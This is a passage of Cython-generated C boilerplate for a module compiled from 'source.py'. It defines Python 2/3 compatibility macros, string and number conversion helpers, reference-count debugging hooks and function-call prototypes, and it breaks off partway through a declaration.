  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
